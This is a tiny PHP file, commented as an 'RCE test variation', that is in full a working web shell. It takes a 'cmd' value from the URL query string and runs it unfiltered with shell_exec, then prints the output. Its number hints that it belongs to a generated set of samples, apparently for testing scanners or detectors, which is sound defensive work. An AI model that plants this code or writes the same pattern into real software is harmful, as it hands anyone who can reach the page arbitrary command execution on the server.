<?php
// RCE test variation #1388
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>